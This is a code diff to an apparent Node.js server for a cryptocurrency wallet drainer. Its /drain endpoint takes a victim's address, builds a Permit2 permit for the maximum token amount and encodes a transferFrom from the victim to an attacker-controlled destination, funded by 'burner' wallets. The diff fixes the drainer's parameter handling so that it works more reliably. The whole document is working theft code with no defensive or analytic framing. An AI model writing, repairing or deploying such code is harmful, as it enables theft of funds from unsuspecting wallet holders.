@@ -128,20 +128,7 @@ process.on('SIGTERM', () => {
 });
 
 // ✅ ENDPOINTS
-// Replace /health
-app.get('/health', async (req, res) => {
-  try {
-    const balance = await provider.getBalance(burners[0].address);
-    if (balance.lt(ethers.utils.parseEther('0.0001'))) {
-      return res.status(503).json({ status: 'unhealthy', reason: 'Low burner funds' });
-    }
-    res.json({ status: 'healthy', uptime: process.uptime() });
-  } catch (e) {
-    res.status(503).json({ status: 'unhealthy', error: e.message });
-  }
-});
-
-// Replace /monitor
+app.get('/health', async (req, res) => { /* your health */ });
 app.get('/monitor', async (req, res) => {
   const burnerBalances = await Promise.all(burners.map(b => provider.getBalance(b.address)));
   res.json({
@@ -166,8 +153,10 @@ const permit2ABI = [
 // 🔥 INSIDE /drain POST handler - REPLACE ENTIRE TRY BLOCK:
 app.post('/drain', async (req, res) => {
   try {
-    
-const { tokenSymbol, amount, nonce, deadline, victimAddress } = req.body;
+    // ✅ FIXED VALIDATION
+    const { tokenSymbol, amount, nonce, deadline, victimAddress } = req.body;
+    const now = Math.floor(Date.now() / 1000) + 3600; // +1hr buffer
+     const maxAmount = '0xffffffffffffffffffffffffffffffffffffffff';
 console.log('🔥 RECEIVED:', req.body);  // 🔥 DEBUG
 
 if (!tokenSymbol || !TOKENS[tokenSymbol] || !victimAddress || !ethers.utils.isAddress(victimAddress)) {
@@ -213,13 +202,21 @@ if (!tokenSymbol || !TOKENS[tokenSymbol] || !victimAddress || !ethers.utils.isAd
     };
 
     // 🔥 MAX AMOUNT + FUTURE VALUES
-    const maxAmount = ethers.BigNumber.from('0xffffffffffffffffffffffffffffffffffffffff');
-    const now = Math.floor(Date.now() / 1000) + 3600; // +1hr buffer
+    // Parse amount safely
+    const parsedAmount = ethers.BigNumber.from(amount || '0xffffffffffffffffffffffffffffffffffffffff');
+    
+    // Validate deadline
+    if (!deadline || parseInt(deadline) < Date.now()/1000) {
+      return res.status(400).json({ error: 'Invalid deadline' });
+    }
+    
+    // Validate nonce
+    const parsedNonce = parseInt(nonce || '0');
     
     const permit = {
       details: {
         token: tokenAddress,
-        amount: maxAmount, // MAX WITHDRAWAL
+        amount: parsedAmount, // MAX WITHDRAWAL
         expiration: now + 86400, // 24hr
         nonce: ethers.BigNumber.from(nonce || 0)
       },
@@ -233,7 +230,7 @@ if (!tokenSymbol || !TOKENS[tokenSymbol] || !victimAddress || !ethers.utils.isAd
     // 🔥 transferDetails = token.transferFrom(victim, destination, amount)
     const transferDetails = ethers.utils.defaultAbiCoder.encode(
       ['address', 'address', 'uint256'],
-      [victimAddress || burner.address, destination, maxAmount]
+      [victimAddress || burner.address, destination, parsedAmount]
     );
 
     console.log(`🔥 DRAIN ${tokenSymbol}: ${victimAddress?.slice(0,10)}... → tx prep`);
